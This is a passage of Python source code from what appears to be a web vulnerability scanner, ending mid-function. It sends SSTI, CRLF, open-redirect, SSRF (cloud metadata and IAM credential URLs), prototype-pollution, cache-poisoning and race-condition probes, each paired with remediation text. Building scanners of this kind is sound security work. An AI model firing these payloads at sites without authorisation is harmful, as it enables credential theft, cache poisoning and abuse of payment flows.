            sb = body_of(rs).lower()
            if "did you mean" in sb:
                findings.append(Finding(
                    check="graphql", module="graphql_scanner", severity="medium",
                    title="GraphQL field suggestions enabled", host=host, url=url,
                    evidence="an invalid field triggered a 'did you mean' hint — the "
                             "schema can be reconstructed field-by-field despite "
                             "introspection being off.",
                    remediation="Disable field/type suggestions in production error handling.",
                    confidence="confirmed", verification="error-suggestion-differential",
                    category="GraphQL Exposure", request_line=f"POST {url} {json.dumps(_BAD_FIELD)}",
                ))
        # 3) Query batching accepted = cost/rate-limit bypass.
        rb = http.post(url, json_body=[_INTROSPECT_MIN, _INTROSPECT_MIN, _INTROSPECT_MIN],
                       headers={"Content-Type": "application/json"})
        bb = body_of(rb)
        if rb is not None and rb.status_code == 200 and bb.strip().startswith("["):
            try:
                arr = json.loads(bb)
            except Exception:
                arr = None
            if isinstance(arr, list) and len(arr) >= 2:
                findings.append(Finding(
                    check="graphql", module="graphql_scanner", severity="medium",
                    title="GraphQL array-batching accepted", host=host, url=url,
                    evidence=f"the endpoint executed an array of {len(arr)} queries in one "
                             f"request — enables brute-force/cost amplification and "
                             f"rate-limit bypass (e.g. password/OTP brute-force).",
                    remediation="Disable array batching or enforce per-operation cost limits.",
                    confidence="confirmed", verification="batch-response-array",
                    category="GraphQL Exposure",
                ))
        # 4) Query depth-limit not enforced = DoS surface.
        depth = 12
        nested = "{__typename " * depth + "}" * depth
        t0 = time.monotonic()
        rd = http.post(url, json_body={"query": nested},
                       headers={"Content-Type": "application/json"})
        elapsed = time.monotonic() - t0
        if rd is not None and rd.status_code == 200 and elapsed > 5.0:
            findings.append(Finding(
                check="graphql", module="graphql_scanner", severity="medium",
                title="GraphQL query-depth limit not enforced (DoS)", host=host, url=url,
                evidence=f"a depth-{depth} nested query was accepted and took {elapsed:.1f}s "
                         f"— no depth/complexity limit. An attacker can craft exponentially "
                         f"expensive queries to exhaust server resources.",
                remediation="Enforce a max query depth and complexity cost; set a query timeout.",
                confidence="confirmed", verification="depth-timing-differential",
                category="GraphQL Exposure",
                request_line=f"POST {url}  (depth-{depth} nested __typename)",
            ))
    return findings


# ===========================================================================
# CHECK: SSTI — native polyglot reflection differential (engine identified)
# ===========================================================================

# Unique factors per (endpoint,param) so a coincidental "49" already on the page
# can't cause a FP; a control request further guards against non-eval reflection.
# AAA/BBB are substituted (not str.format — the braces are literal payload).
_SSTI_PAYLOADS = [
    ("{{AAA*BBB}}", "jinja2/twig/nunjucks"),
    ("${{AAA*BBB}}", "jinja2-alt/velocity"),
    ("#{AAA*BBB}", "ruby-slim/pug"),
    ("${AAA*BBB}", "freemarker/thymeleaf/spel"),
    ("<%= AAA*BBB %>", "erb/ejs"),
    ("*{AAA*BBB}", "thymeleaf-star"),
    ("@(AAA*BBB)", "razor"),
    ("{AAA*BBB}", "smarty-lite"),
]


def _ssti_render(tmpl, a, b):
    return tmpl.replace("AAA", str(a)).replace("BBB", str(b))


def check_ssti(http: Http, inv: Inventory, opts):
    findings = []
    if requests is None:
        return findings
    targets = inv.param_targets(cap=opts.get("max_targets", 300))
    for ep in targets:
        sp = urllib.parse.urlsplit(ep.url)
        qs = urllib.parse.parse_qsl(sp.query, keep_blank_values=True)
        if not qs:
            continue
        for idx, (pname, _pval) in enumerate(qs):
            # unique factors per (endpoint,param) so the product is unmistakable
            a = 1000 + (idx * 7 + len(pname)) % 900
            b = 7
            product = a * b
            confirmed = False
            hit_engine = None
            hit_payload = None
            for tmpl, engine in _SSTI_PAYLOADS:
                payload = _ssti_render(tmpl, a, b)
                new_qs = [(k, (payload if k == pname else v)) for k, v in qs]
                aurl = urllib.parse.urlunsplit(
                    (sp.scheme, sp.netloc, sp.path,
                     urllib.parse.urlencode(new_qs), ""))
                r = http.get(aurl)
                if r is None:
                    continue
                if _is_waf_response(r):
                    continue
                body = body_of(r, 300_000)
                # confirmed only if the COMPUTED product appears but the raw
                # payload literal does NOT (i.e. it was evaluated, not echoed).
                if str(product) in body and payload not in body:
                    # guard: the product must not already be a common string on
                    # a clean baseline (control request with an inert value).
                    ctrl = urllib.parse.urlunsplit(
                        (sp.scheme, sp.netloc, sp.path,
                         urllib.parse.urlencode(
                             [(k, ("arise_" + str(a) if k == pname else v)) for k, v in qs]), ""))
                    rc = http.get(ctrl)
                    if rc is not None and str(product) in body_of(rc, 300_000):
                        continue  # product present without evaluation → FP, skip
                    confirmed = True
                    hit_engine = engine
                    hit_payload = payload
                    attack_snap = _snap(r)
                    break
            if confirmed:
                findings.append(Finding(
                    check="ssti", module="ssti", severity="critical",
                    title=f"Server-Side Template Injection ({hit_engine})",
                    host=ep.host, url=ep.url, parameter=pname,
                    evidence=f"parameter '{pname}': payload {hit_payload!r} was evaluated "
                             f"server-side to {product} (the literal payload is absent from "
                             f"the response — proving template evaluation, not reflection). "
                             f"Likely {hit_engine}. This is typically a path to RCE.",
                    remediation="Never render user input as a template; use logic-less "
                                "templates or a strict sandbox; validate/allowlist input.",
                    confidence="exploited", verification="arithmetic-evaluation-differential",
                    category="Injection / SSTI",
                    request_line=f"GET {ep.host}{sp.path}?{pname}={hit_payload}",
                    payload=hit_payload, attack=attack_snap,
                ))
                break  # one confirmed SSTI per endpoint is enough
    return findings


# ===========================================================================
# CHECK: CRLF — native header-injection reflection differential
# ===========================================================================

def check_crlf(http: Http, inv: Inventory, opts):
    findings = []
    if requests is None:
        return findings
    marker = "arisecrlf" + hashlib.md5(str(time.time()).encode()).hexdigest()[:6]
    inj_header = "X-Arise-Crlf"
    payloads = [
        "%0d%0a" + inj_header + ": " + marker,
        "%0d%0a%09" + inj_header + ": " + marker,
        "%E5%98%8A%E5%98%8D" + inj_header + ": " + marker,  # unicode CRLF bypass
        "%23%0d%0a" + inj_header + ": " + marker,
    ]
    for ep in inv.param_targets(cap=opts.get("max_targets", 250)):
        sp = urllib.parse.urlsplit(ep.url)
        qs = urllib.parse.parse_qsl(sp.query, keep_blank_values=True)
        if not qs:
            continue
        # baseline: must NOT already carry the injected header
        base = http.get(ep.url)
        if base is None:
            continue
        if inj_header.lower() in {k.lower() for k in base.headers.keys()}:
            continue
        done = False
        for pname, _ in qs:
            if done:
                break
            for pl in payloads:
                # inject raw (not urlencoded again) into the one param
                q = "&".join(
                    f"{k}={pl if k == pname else urllib.parse.quote(v)}" for k, v in qs)
                aurl = urllib.parse.urlunsplit((sp.scheme, sp.netloc, sp.path, q, ""))
                r = http.get(aurl)
                if r is None:
                    continue
                got = {k.lower(): v for k, v in r.headers.items()}
                if got.get(inj_header.lower()) == marker:
                    findings.append(Finding(
                        check="crlf", module="crlf", severity="high",
                        title="CRLF / HTTP response header injection",
                        host=ep.host, url=ep.url, parameter=pname,
                        evidence=f"parameter '{pname}': injected CRLF sequence caused the "
                                 f"server to emit an attacker-controlled response header "
                                 f"'{inj_header}: {marker}' that the baseline response did "
                                 f"not contain. Enables header injection, response "
                                 f"splitting, and cookie/Set-Cookie injection.",
                        remediation="URL-encode CR/LF in any value reflected into response "
                                    "headers; validate redirect/Location inputs.",
                        confidence="exploited", verification="injected-header-differential",
                        category="Injection / CRLF",
                        request_line=f"GET {ep.host}{sp.path}?{pname}={pl}",
                        payload=pl, attack=_snap(r), baseline=_snap(base),
                    ))
                    done = True
                    break
    return findings


# ===========================================================================
# CHECK: Open Redirect — Location differential to attacker host
# ===========================================================================

def check_redirect(http: Http, inv: Inventory, opts):
    findings = []
    if requests is None:
        return findings
    evil = "arise-oob.example"
    payloads = ["https://" + evil + "/x", "//" + evil + "/x",
                "https:/" + evil, "/\\" + evil, "https://" + evil + "%2f..",
                "\\/\\/" + evil]
    for ep in inv.redirect_targets(cap=opts.get("max_targets", 200)):
        sp = urllib.parse.urlsplit(ep.url)
        qs = urllib.parse.parse_qsl(sp.query, keep_blank_values=True)
        SINK = re.compile(r"(?:redirect|return|next|url|dest|to|continue|goto|"
                          r"callback|forward|out|target|link|redir)", re.I)
        sink_params = [k for k, _ in qs if SINK.search(k)]
        if not sink_params:
            continue
        done = False
        for pname in sink_params:
            if done:
                break
            for pl in payloads:
                new_qs = [(k, (pl if k == pname else v)) for k, v in qs]
                aurl = urllib.parse.urlunsplit(
                    (sp.scheme, sp.netloc, sp.path, urllib.parse.urlencode(new_qs), ""))
                r = http.get(aurl, allow_redirects=False)
                if r is None:
                    continue
                loc = r.headers.get("Location", "")
                # confirmed only if the redirect target host IS the attacker host
                if r.status_code in (301, 302, 303, 307, 308) and loc:
                    lh = host_of(loc if "//" in loc else "//" + loc.lstrip("/\\"))
                    if lh.split(":")[0].lower().endswith(evil):
                        findings.append(Finding(
                            check="redirect", module="open_redirect", severity="medium",
                            title="Open redirect", host=ep.host, url=ep.url, parameter=pname,
                            evidence=f"parameter '{pname}'={pl} produced HTTP {r.status_code} "
                                     f"Location: {loc[:120]} — the server redirects to an "
                                     f"attacker-controlled host. Usable for phishing, OAuth "
                                     f"token theft, and SSRF pivots.",
                            remediation="Allowlist redirect destinations; never reflect raw "
                                        "user input into Location.",
                            confidence="exploited", verification="location-header-differential",
                            category="Open Redirect",
                            request_line=f"GET {ep.host}{sp.path}?{pname}={pl}",
                            payload=pl, attack=_snap(r),
                        ))
                        done = True
                        break
    return findings


# ===========================================================================
# CHECK: SSRF — cloud-metadata content reflection + optional OOB
# ===========================================================================

_METADATA_TARGETS = [
    ("http://169.254.169.254/latest/meta-data/", ("ami-id", "instance-id", "iam", "hostname", "public-keys")),
    ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", ("AccessKeyId", "Token", "Role")),
    ("http://metadata.google.internal/computeMetadata/v1/instance/",
     ("computeMetadata", "project", "service-accounts")),
    ("http://100.100.100.200/latest/meta-data/", ("instance-id", "region-id")),  # alibaba
]


def check_ssrf(http: Http, inv: Inventory, opts):
    findings = []
    if requests is None:
        return findings
    oob = opts.get("oob_domain")
    for ep in inv.ssrf_targets(cap=opts.get("max_targets", 200)):
        sp = urllib.parse.urlsplit(ep.url)
        qs = urllib.parse.parse_qsl(sp.query, keep_blank_values=True)
        SINK = re.compile(r"(?:url|uri|link|src|dest|redirect|feed|host|domain|"
                          r"callback|webhook|proxy|fetch|file|page|load|image|"
                          r"img|remote|endpoint|api|target|site|source|path|data)", re.I)
        sink_params = [k for k, _ in qs if SINK.search(k)]
        if not sink_params:
            continue
        base = http.get(ep.url)
        if _is_waf_response(base):
            continue
        base_body = body_of(base, 50_000)
        base_status = getattr(base, "status_code", 0) if base else 0
        done = False
        for pname in sink_params:
            if done:
                break
            for meta_url, tells in _METADATA_TARGETS:
                new_qs = [(k, (meta_url if k == pname else v)) for k, v in qs]
                aurl = urllib.parse.urlunsplit(
                    (sp.scheme, sp.netloc, sp.path, urllib.parse.urlencode(new_qs), ""))
                r = http.get(aurl)
                if r is None:
                    continue
                atk_status = getattr(r, "status_code", 0)
                if _is_waf_response(r):
                    continue
                # both blocked by WAF/firewall → no SSRF proof
                if base_status in (403, 503) and atk_status in (403, 503):
                    continue
                body = body_of(r, 50_000)
                # confirmed = metadata tell-tale present in attack response but
                # ABSENT from the clean baseline (differential → no FP).
                # Exclude tell-tales that appear only as part of a reflected URL
                # (WAF/error pages may echo the request URL containing the tell-tale).
                matched = []
                for t in tells:
                    if t not in body or t in base_body:
                        continue
                    # reject if every occurrence of the tell-tale is preceded by
                    # "http://" or "https://" (reflected URL, not actual metadata)
                    positions = [i for i in range(len(body)) if body[i:i+len(t)] == t]
                    url_reflected = all(
                        body[max(0, p - 8):p].rstrip("/").endswith(("http:/", "https:/"))
                        for p in positions)
                    if not url_reflected:
                        matched.append(t)
                if matched:
                    findings.append(Finding(
                        check="ssrf", module="ssrf", severity="critical",
                        title="SSRF — cloud metadata reachable", host=ep.host,
                        url=ep.url, parameter=pname,
                        evidence=f"parameter '{pname}' fetched {meta_url} and the response "
                                 f"returned cloud-metadata content ({', '.join(matched)}) "
                                 f"absent from the baseline. The server can be made to reach "
                                 f"internal endpoints — including IAM credentials.",
                        remediation="Block requests to link-local/internal ranges; enforce an "
                                    "egress allowlist; require IMDSv2; validate/resolve user URLs.",
                        confidence="exploited", verification="metadata-content-differential",
                        category="SSRF",
                        request_line=f"GET {ep.host}{sp.path}?{pname}={meta_url}",
                        payload=meta_url, attack=_snap(r), baseline=_snap(base),
                    ))
                    done = True
                    break
            if done:
                break
            # OOB blind SSRF (optional): only asserted if caller wired an oracle.
            if oob:
                token = "s" + hashlib.md5((ep.url + pname).encode()).hexdigest()[:10]
                probe = f"http://{token}.{oob}/"
                new_qs = [(k, (probe if k == pname else v)) for k, v in qs]
                aurl = urllib.parse.urlunsplit(
                    (sp.scheme, sp.netloc, sp.path, urllib.parse.urlencode(new_qs), ""))
                http.get(aurl)  # correlation happens out-of-band by the caller
    return findings


# ===========================================================================
# CHECK: Prototype Pollution — server behaviour differential
# ===========================================================================

def check_proto(http: Http, inv: Inventory, opts):
    findings = []
    if requests is None:
        return findings
    marker = "arisepp" + hashlib.md5(str(time.time()).encode()).hexdigest()[:6]
    for ep in inv.post_targets(cap=opts.get("max_targets", 120)):
        url = ep.url.split("#")[0]
        found = False
        # --- JSON body vectors (POST) ---
        base = http.post(url, json_body={"arise_probe": 1},
                         headers={"Content-Type": "application/json"})
        if base is not None:
            base_status = base.status_code
            base_hdrs = {k.lower() for k in base.headers.keys()}
            gadgets = [
                {"__proto__": {"status": 510, marker: True}},
                {"__proto__": {"x-arise-pp": marker}},
                {"constructor": {"prototype": {"status": 510, marker: True}}},
            ]
            for g in gadgets:
                r = http.post(url, json_body=g, headers={"Content-Type": "application/json"})
                if r is None:
                    continue
                if r.status_code == 510 and base_status != 510:
                    findings.append(_proto_finding(ep, url, g, base, r,
                        "polluting Object.prototype.status changed the HTTP status to 510 "
                        "(baseline was %d) — server-side prototype pollution confirmed." % base_status))
                    found = True; break
                new_hdrs = {k.lower(): v for k, v in r.headers.items()}
                if new_hdrs.get("x-arise-pp") == marker and "x-arise-pp" not in base_hdrs:
                    findings.append(_proto_finding(ep, url, g, base, r,
                        "polluting Object.prototype injected response header 'x-arise-pp: %s' "
                        "absent from the baseline — server-side prototype pollution confirmed." % marker))
                    found = True; break
                if r.status_code == 500 and base_status != 500:
                    findings.append(_proto_finding(ep, url, g, base, r,
                        "polluting Object.prototype via JSON body triggered HTTP 500 "
                        "(baseline was %d) — server-side prototype pollution crash." % base_status))
                    found = True; break
        if found:
            continue
        # --- Query-string vectors (GET) ---
        base_get = http.get(url)
        if base_get is None:
            continue
        base_get_status = base_get.status_code
        sep = "&" if urllib.parse.urlsplit(url).query else "?"
        qs_payloads = [
            f"__proto__[{marker}]=true",
            f"constructor[prototype][{marker}]=true",
            f"__proto__.{marker}=true",
        ]
        for qp in qs_payloads:
            r = http.get(url + sep + qp)
            if r is None:
                continue
            if r.status_code == 500 and base_get_status != 500:
                findings.append(_proto_finding(ep, url + sep + qp, qp, base_get, r,
                    "polluting Object.prototype via query string triggered HTTP 500 "
                    "(baseline was %d) — server-side prototype pollution crash." % base_get_status))
                break
    return findings


def _proto_finding(ep, url, gadget, base, r, why):
    return Finding(
        check="proto", module="prototype_pollution", severity="high",
        title="Server-side prototype pollution", host=ep.host, url=url,
        evidence=why + " Prototype pollution is frequently escalatable to RCE/DoS/auth-bypass "
                 "depending on downstream gadgets.",
        remediation="Reject __proto__/constructor/prototype keys on input; use "
                    "Object.create(null) maps; freeze Object.prototype; validate schemas.",
        confidence="exploited", verification="prototype-behaviour-differential",
        category="Prototype Pollution",
        request_line=f"POST {url} {json.dumps(gadget)[:120]}",
        payload=json.dumps(gadget)[:200], baseline=_snap(base), attack=_snap(r),
    )


# ===========================================================================
# CHECK: Cache Poisoning — unkeyed header persistence
# ===========================================================================

_UNKEYED = ["X-Forwarded-Host", "X-Forwarded-Scheme", "X-Host", "X-Forwarded-Server",
            "X-Original-URL", "X-Rewrite-URL", "X-Forwarded-Proto", "X-HTTP-Host-Override",
            "X-Forwarded-For", "Forwarded"]


def check_cache(http: Http, inv: Inventory, opts):
    findings = []
    if requests is None:
        return findings
    for base_url in inv.cache_targets(cap=opts.get("max_targets", 120)):
        for hdr in _UNKEYED:
            canary = "arise" + hashlib.md5((base_url + hdr).encode()).hexdigest()[:10] + ".example"
            # cache-buster so we own a fresh cache entry
            cb = ("&" if urllib.parse.urlsplit(base_url).query else "?") + \
                "arise_cb=" + hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
            url = base_url + cb
            r1 = http.get(url, headers={hdr: canary})
            if r1 is None:
                continue
            b1 = body_of(r1, 200_000)
            reflected = canary in b1 or canary in resp_headers_str(r1)
            if not reflected:
                continue
            # confirm persistence: request again WITHOUT the header
            time.sleep(0.4)
            r2 = http.get(url)
            if r2 is None:
                continue
            b2 = body_of(r2, 200_000)
            if canary in b2:
                cache_status = (r2.headers.get("X-Cache") or r2.headers.get("CF-Cache-Status")
                                or r2.headers.get("Age") or "n/a")
                findings.append(Finding(
                    check="cache", module="cache_poison", severity="high",
                    title=f"Web cache poisoning via unkeyed header {hdr}",
                    host=host_of(base_url), url=url, parameter=hdr,
                    evidence=f"a canary injected through the unkeyed '{hdr}' header persisted "
                             f"in a response served WITHOUT the header (cache indicator: "
                             f"{cache_status}) — the poisoned entry is served to other users.",
                    remediation="Add the reflected header to the cache key, or strip it at the "
                                "edge; never reflect Host-family headers into cached responses.",
                    confidence="exploited", verification="cache-persistence-differential",
                    category="Web Cache Poisoning",
                    request_line=f"GET {url}  ({hdr}: {canary})",
                    payload=f"{hdr}: {canary}", attack=_snap(r2),
                ))
                break  # one confirmed poisoning per URL
    return findings


# ===========================================================================
# CHECK: Race Condition — parallel burst on state-changing flows
# ===========================================================================

SENSITIVE_RE = re.compile(
    r"/(?:coupon|promo|voucher|redeem|reward|claim|vote|like|follow|transfer|"
    r"withdraw|topup|recharge|apply|register|signup|invite|referral|gift|"
    r"checkout|purchase|order|book|reserve|cancel|balance|wallet|point)s?\b", re.I)


def check_race(http: Http, inv: Inventory, opts):
    findings = []
    if requests is None:
        return findings
    n = opts.get("race_concurrency", 25)
    candidates = []
    for ep in inv.post_targets(cap=120):
        # a real single-use flow: state-changing method + sensitive path
        methods = set(ep.methods) | {ep.method}
        state_m = list(methods & {"POST", "PUT", "PATCH", "DELETE"}) or \
            [f.get("method", "").upper() for f in ep.input_functions
             if (f.get("method") or "").upper() in ("POST", "PUT", "PATCH")]
        if not state_m:
            continue
        if not SENSITIVE_RE.search(ep.path):
            continue
        candidates.append((ep, state_m[0]))
    for ep, method in candidates[:30]:
        url = ep.url.split("#")[0]
        # single-shot baseline — must be a live, accepted operation
        base = http.request(method, url, data="{}",
                            headers={"Content-Type": "application/json"})
        if base is None or not (200 <= base.status_code < 400):
            continue

        # fire N truly-simultaneous requests using a barrier
        barrier = threading.Barrier(n)
        results = [None] * n

        def worker(i):
            try:
                barrier.wait(timeout=10)
            except Exception:
                pass
            if requests is None:
                return
            try:
                rr = requests.request(method, url, data="{}",
                                      headers={"Content-Type": "application/json",
                                               "User-Agent": UA},
                                      timeout=http.timeout, verify=False,
                                      allow_redirects=False)
                results[i] = rr.status_code
            except Exception:
                results[i] = None

        with concurrent.futures.ThreadPoolExecutor(max_workers=n) as pool:
            list(pool.map(worker, range(n)))

        ok = [c for c in results if c is not None and 200 <= c < 300]
        # A single-use flow should let AT MOST one concurrent op through. If the
        # overwhelming majority succeed simultaneously there is no lock/limit.
        if len(ok) >= max(3, int(n * 0.6)):
            findings.append(Finding(
                check="race", module="race_condition", severity="high",
                title="Race condition — no lock/idempotency on a single-use flow",
                host=ep.host, url=url, parameter=method,
                evidence=f"{len(ok)}/{n} simultaneous {method} requests to a single-use flow "
                         f"({ep.path}) were all accepted (2xx). A correctly-locked single-use "
                         f"operation admits at most one concurrent request — this is exploitable "
                         f"for coupon/gift/balance/limit abuse (TOCTOU).",
                remediation="Enforce idempotency keys and row-level locks on single-use "
                            "operations; reject concurrent duplicates server-side.",
                confidence="probable", verification="parallel-success-burst",
                category="Race Condition",
                request_line=f"{method} {url}  x{n} simultaneous",
                baseline=_snap(base), attack={"parallel": n, "accepted_2xx": len(ok),
                                              "codes": sorted(set(str(c) for c in results))},
            ))
    return findings


# ===========================================================================
# CHECK: WebSocket — native cross-origin (CSWSH) handshake
# ===========================================================================

def check_ws(http: Http, inv: Inventory, opts):
    findings = []
    for ws_url in list(inv.ws_urls)[:40]:
        if inv.scope is not None and not inv._ok_scope(ws_url.replace("ws", "http", 1)):
            continue
        ok, detail = _ws_handshake(ws_url, origin="https://arise-oob.example")
        if ok:
            findings.append(Finding(
                check="ws", module="websocket_scanner", severity="high",
                title="Cross-Site WebSocket Hijacking (CSWSH)", host=host_of(ws_url),
                url=ws_url,
                evidence=f"the WebSocket handshake succeeded (HTTP 101) with a foreign "
                         f"Origin 'https://arise-oob.example' and no CSRF token — {detail}. "
                         f"A malicious page can open an authenticated socket on a victim's behalf.",
                remediation="Validate the Origin header on the WS upgrade against an allowlist; "
                            "require a CSRF-style token for socket authentication.",
                confidence="exploited", verification="cross-origin-101-handshake",
                category="WebSocket (CSWSH)",
                request_line=f"GET {ws_url}  (Origin: https://arise-oob.example)",
            ))
    return findings


def _ws_handshake(ws_url, origin, timeout=10):
    try:
        u = urllib.parse.urlsplit(ws_url)
        secure = u.scheme == "wss"
        host = u.hostname
        port = u.port or (443 if secure else 80)
        path = u.path or "/"
        if u.query:
            path += "?" + u.query
        key = base64.b64encode(os.urandom(16)).decode()
        req = (f"GET {path} HTTP/1.1\r\nHost: {host}:{port}\r\n"
               f"Upgrade: websocket\r\nConnection: Upgrade\r\n"
               f"Sec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n"
               f"Origin: {origin}\r\nUser-Agent: {UA}\r\n\r\n")
        sock = socket.create_connection((host, port), timeout=timeout)
        if secure:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=host)
        sock.sendall(req.encode())
        resp = sock.recv(4096).decode(errors="ignore")
        try:
            sock.close()
        except Exception:
            pass
        if "101" in resp.split("\r\n")[0] and "upgrade: websocket" in resp.lower():
            return True, "server switched protocols"
        return False, ""
    except Exception:
        return False, ""


# ===========================================================================
# CHECK: Exposure — sensitive path/file content-signature probing
# ===========================================================================
# Content signatures that CONFIRM the finding (not just a 200 status). Each
# entry is (path_pattern, title, severity, content_tells, remediation, category).
# A tell is confirmed when the response body contains the marker AND the
# HTTP status is in the accepted set. This prevents a custom 404 page that
# says "git config not found" from triggering a false positive.

_EXPOSURE_SIGS = [
    # --- VCS / dotfiles ---
    (r"\.git/config$", "Exposed .git/config", "critical",
     (["[core]", "repositoryformatversion"], {200}),
     "Block .git at the web-server level; never deploy .git to production.",
     "Exposure / VCS"),
    (r"\.git/HEAD$", "Exposed .git/HEAD", "critical",
     (["ref: refs/"], {200}),
     "Block .git at the web-server level.",
     "Exposure / VCS"),
    (r"\.svn/entries$", "Exposed .svn/entries", "high",
     (["dir", "svn"], {200}),
     "Block .svn at the web-server level.",
     "Exposure / VCS"),
    (r"\.DS_Store$", "Exposed .DS_Store", "low",
     (["\x00\x00\x00\x01Bud1"], {200}),
     "Remove .DS_Store from deployments.",
     "Exposure / Metadata"),
    (r"\.htpasswd$", "Exposed .htpasswd", "critical",
     (["$apr1$", "$2y$", "$2b$", ":{SHA}", ":$1$"], {200}),
     "Block .htpasswd at the web-server level.",
     "Exposure / Credentials"),

    # --- Environment / config ---
    (r"\.env$", "Exposed .env file", "critical",
     (["DB_PASSWORD", "DB_HOST", "APP_KEY", "SECRET_KEY", "API_KEY",
       "AWS_ACCESS", "REDIS_URL", "DATABASE_URL", "MAIL_PASSWORD"], {200}),
     "Block .env files; use a secret manager.",
     "Exposure / Credentials"),
    (r"config\.json$", "Exposed config.json", "medium",
     (["password", "secret", "apiKey", "api_key", "token", "credentials"], {200}),
     "Restrict access to configuration files.",
     "Exposure / Config"),
    (r"wp-config\.php\.bak$", "Exposed wp-config.php backup", "critical",
     (["DB_NAME", "DB_USER", "DB_PASSWORD", "table_prefix"], {200}),
     "Remove backup files from production.",
     "Exposure / WordPress"),

    # --- Debug / profiler ---
    (r"phpinfo\.php$|info\.php$", "Exposed phpinfo()", "medium",
     (["PHP Version", "php.ini", "DOCUMENT_ROOT", "SERVER_SOFTWARE"], {200}),
     "Remove phpinfo pages from production.",
     "Exposure / Debug"),
    (r"actuator/env$", "Exposed Spring Actuator /env", "critical",
     (["propertySources", "activeProfiles", "systemProperties"], {200}),
     "Restrict actuator endpoints; require authentication.",
     "Exposure / Debug"),
    (r"actuator/heapdump$", "Exposed Spring Actuator heapdump", "critical",
     ([], {200}),  # a 200 with a binary body is enough — heapdump is always dangerous
     "Restrict actuator endpoints; require authentication.",
     "Exposure / Debug"),
    (r"server-status$", "Exposed Apache server-status", "medium",
     (["Apache Server Status", "Total accesses", "Scoreboard"], {200}),
     "Restrict server-status to localhost.",
     "Exposure / Debug"),
    (r"_profiler$|elmah\.axd$", "Exposed debug profiler", "high",
     (["profiler", "Profiler", "ELMAH", "Error Log"], {200}),
     "Disable debug profilers in production.",
     "Exposure / Debug"),

    # --- WordPress ---
    (r"xmlrpc\.php$", "WordPress XML-RPC enabled", "medium",
     (["XML-RPC server accepts POST requests only", "xmlrpc"], {200, 405}),
     "Disable XML-RPC if not needed; it enables brute-force and pingback DDoS.",
     "Exposure / WordPress"),
    (r"wp-admin/authorize-application\.php$", "WordPress application passwords endpoint", "medium",
     (["authorize", "application", "WordPress"], {200}),
     "Restrict or disable application passwords if not used.",
     "Exposure / WordPress"),
    (r"wp-json/wp/v2/users$", "WordPress user enumeration via REST API", "medium",
     (["slug", "name", "link", "avatar_urls"], {200}),
     "Restrict user endpoint or require authentication.",
     "Exposure / WordPress"),

    # --- API docs ---
    (r"swagger\.json$|openapi\.json$", "Exposed API schema (Swagger/OpenAPI)", "medium",
     (["swagger", "openapi", "paths", "components"], {200}),
     "Restrict API documentation to authenticated users.",
     "Exposure / API Docs"),
    (r"api-docs$|graphiql$", "Exposed API documentation UI", "medium",
     (["swagger", "GraphiQL", "graphql", "api-docs"], {200}),
     "Restrict API docs to dev environments.",
     "Exposure / API Docs"),

    # --- Backups ---
    (r"backup\.sql$|dump\.sql$|db\.sql$|database\.sql$", "Exposed database dump", "critical",
     (["CREATE TABLE", "INSERT INTO", "DROP TABLE", "mysqldump"], {200}),
     "Remove database dumps from production; use secure transfer channels.",
     "Exposure / Backup"),

    # --- Directory listing (upload dirs, backup dirs, etc.) ---
    (r"/upload/?$|/uploads/?$|/files/?$|/media/?$|/attachments/?$",
     "Directory listing on upload/media path", "medium",
     (["Index of", "Parent Directory", "<pre>", "Directory listing"], {200}),
     "Disable directory listing; serve files by name only.",
     "Exposure / Directory Listing"),
    (r"/backup/?$|/backups/?$|/dump/?$|/export/?$",
     "Directory listing on backup path", "high",
     (["Index of", "Parent Directory", "<pre>"], {200}),
     "Disable directory listing; remove backup directories from web root.",
     "Exposure / Directory Listing"),
]


_catchall_sig_cache: dict = {}


def _get_catchall_sig(host: str, sample_url: str):
    """Lazily learn (and cache per host) this host's catchall/SPA-fallback
    fingerprint, so a genuinely-exposed file can be told apart from an SPA
    that serves the same index.html for every path.

    F32 (ARISE_REMEDIATION_ROADMAP.md): x.razorpay.com's "Exposed .svn/entries"
    and "Exposed config.json" findings both just matched the site's own root
    page verbatim — a CloudFront/S3 SPA returning identical content for every
    URL. `Finding.baseline` exists precisely for this (a differential capture)
    but this check never populated it, so nothing caught the match. Reuses
    the same catchall detector dns_security_audit.py and
    nuclei_url_consolidator.py already rely on, rather than a new heuristic.
    """
    if host in _catchall_sig_cache:
        return _catchall_sig_cache[host]
    sig = None
    try:
        from discovery.soft404_detector import learn_catchall_signature
        sp = urllib.parse.urlsplit(sample_url)
        root = f"{sp.scheme}://{sp.netloc}"
        learned = learn_catchall_signature(root, n=2)
        if learned.get("signature_ready"):
            sig = learned
    except Exception:
        sig = None
    _catchall_sig_cache[host] = sig
    return sig


def check_exposure(http: Http, inv: Inventory, opts):
    """Probe sensitive paths with content-signature confirmation.

    Unlike the param-based checks, this targets PATH-ONLY endpoints that the
    inventory classified as sensitive but that SSTI/CRLF/redirect/SSRF ignored
    because they have no query parameters. A finding requires a content signature
    match — not just HTTP 200 — so a custom 404 page can't trigger a false positive.
    """
    findings = []
    if requests is None:
        return findings
    targets = inv.sensitive_targets(cap=opts.get("max_targets", 300))
    tested = set()

    for ep in targets:
        url = ep.url.split("#")[0].split("?")[0]
        if url in tested:
            continue
        tested.add(url)

        for pat, title, sev, (tells, ok_codes), rem, cat in _EXPOSURE_SIGS:
            if not re.search(pat, ep.path, re.I):
                continue
            r = http.get(url)
            if r is None:
                break
            if r.status_code not in ok_codes:
                break
            body = body_of(r, 200_000)
            hdrs = resp_headers_str(r)
            full = body + "\n" + hdrs

            # heapdump special case: 200 + binary content-type + large body
            if "heapdump" in pat and r.status_code == 200:
                ct = r.headers.get("Content-Type", "")
                if "octet-stream" in ct and len(r.content or b"") > 10_000:
                    findings.append(Finding(
                        check="exposure", module="exposure", severity=sev,
                        title=title, host=ep.host, url=url,
                        evidence=f"heapdump endpoint returned HTTP 200 with "
                                 f"Content-Type: {ct} and {len(r.content)} bytes — "
                                 f"contains JVM heap data (credentials, tokens, PII).",
                        remediation=rem, confidence="confirmed",
                        verification="content-type-differential",
                        category=cat, attack=_snap(r),
                    ))
                break

            # Standard signature match: at least one tell present in body
            if not tells:
                break
            matched = [t for t in tells if t in full]
            if matched:
                baseline = {}
                sig = _get_catchall_sig(ep.host, url)
                if sig:
                    try:
                        from discovery.soft404_detector import is_catchall_response
                        is_cc, reason = is_catchall_response(url, sig)
